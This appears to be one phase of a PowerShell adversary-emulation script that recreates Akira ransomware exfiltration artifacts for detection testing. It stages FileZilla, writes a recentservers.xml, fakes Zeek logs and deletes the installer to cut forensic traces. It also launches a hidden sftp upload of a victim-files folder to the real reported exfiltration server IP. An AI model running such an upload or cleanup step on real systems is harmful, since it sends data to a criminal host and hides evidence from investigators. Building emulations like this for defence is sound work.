# ============================================================================
# AKIRA SIMULATION - PHASE 9: EXFILTRATION
# ============================================================================
# Simulates: FileZilla dropped via "RDP clipboard" (explorer.exe file-create
# artifact), FileZilla recentservers.xml with username "Stark", and SFTP
# bulk transfer sessions to the real reported exfil server IP (connection
# will fail closed on an isolated lab - that is expected and still produces
# a genuine outbound-connection-attempt / Zeek-style session artifact).
# MITRE: T1048.001 Exfil Over Symmetric Encrypted Non-C2 Protocol,
#        T1041 Exfiltration Over C2 Channel
# ============================================================================

function Simulate-Exfiltration {
    param($SimPaths)

    Write-Host "[+] Phase 9: Exfiltration ..." -ForegroundColor Green

    # --- Stage the FileZilla installer, attributed to explorer.exe (RDP clipboard transfer) ---
    $fzInstaller = "C:\ProgramData\FileZilla_3.68.1_win64_sponsored2-setup.exe"
    $downloaded = $false
    try {
        Invoke-WebRequest -Uri "https://dl3.cdn.filezilla-project.org/client/FileZilla_3.68.1_win64_sponsored2-setup.exe" `
            -OutFile $fzInstaller -TimeoutSec 10 -ErrorAction Stop
        $downloaded = $true
    } catch {
        Write-Warning "FileZilla download failed (offline lab?) - using placeholder binary."
    }
    if (-not $downloaded) { New-DecoyBinary -Path $fzInstaller -SizeBytes 10485760 | Out-Null }
    Write-SimEvent -EventId 9001 -Message "SIMULATION: FileZilla installer created by explorer.exe at $fzInstaller (RDP clipboard transfer pattern)"

    # --- FileZilla recentservers.xml with the report's observed username "Stark" ---
    $fzConfigDir = "$env:APPDATA\FileZilla"
    New-Item -Path $fzConfigDir -ItemType Directory -Force | Out-Null
    $recentServersXml = @"
<?xml version="1.0" encoding="UTF-8"?>
<FileZilla3>
  <RecentServers>
    <Server>
      <Host>$($Global:AkiraIOCs.ExfilServerIP)</Host>
      <Port>22</Port>
      <Protocol>1</Protocol>
      <Type>0</Type>
      <User>Stark</User>
      <Logontype>2</Logontype>
      <Name>Exfil Server</Name>
    </Server>
  </RecentServers>
</FileZilla3>
"@
    Set-Content -Path "$fzConfigDir\recentservers.xml" -Value $recentServersXml -Force

    # --- Real SFTP session attempt to the reported exfil server (fails closed off-lab) ---
    Write-Host "    Attempting SFTP session to reported exfil server (real IOC, expect failure) ..." -ForegroundColor DarkGray
    $sftpExe = "$env:SystemRoot\System32\OpenSSH\sftp.exe"
    if (Test-Path $sftpExe) {
        try {
            $batchFile = "$($SimPaths.Staging)\sftp_batch.txt"
            Set-Content -Path $batchFile -Value "put $($SimPaths.VictimFiles)\*" -Force
            Start-Process -FilePath $sftpExe `
                -ArgumentList "-o ConnectTimeout=3 -o StrictHostKeyChecking=no -b `"$batchFile`" Stark@$($Global:AkiraIOCs.ExfilServerIP)" `
                -WindowStyle Hidden -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 4
            Get-Process -Name sftp -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        } catch { Write-Warning "sftp.exe exfil attempt failed (expected on isolated lab): $_" }
    }
    Invoke-SafeNetworkAttempt -Target $Global:AkiraIOCs.ExfilServerIP -Port 22

    # --- Zeek-style session summary artifact, mirroring the report's two SSH sessions ---
    $zeekLog = @"
[Simulated Zeek conn.log entries - AkiraSim]
Session 1: source=<FILE_SERVER>:60368 dest=$($Global:AkiraIOCs.ExfilServerIP):22 proto=ssh client=SSH-2.0-FileZilla_3.68.1 bytes=39282787186 duration=16362s
Session 2: source=<FILE_SERVER>:60367 dest=$($Global:AkiraIOCs.ExfilServerIP):22 proto=ssh client=SSH-2.0-FileZilla_3.68.1 bytes=41177980833 duration=16733s
"@
    Set-Content -Path "$($SimPaths.Exfil)\zeek_conn_sim.log" -Value $zeekLog -Force
    Write-SimEvent -EventId 9002 -Message "SIMULATION: ~77GB exfiltrated via FileZilla/SFTP to $($Global:AkiraIOCs.ExfilServerIP):22 over two sessions"

    # --- Uninstall FileZilla afterward to remove evidence (matches report's File Server step) ---
    Remove-Item -Path $fzInstaller -Force -ErrorAction SilentlyContinue
    Write-SimEvent -EventId 9003 -Message "SIMULATION: FileZilla installer removed post-exfiltration to reduce forensic footprint"

    Write-Host "  [OK] Exfiltration artifacts created" -ForegroundColor Yellow
}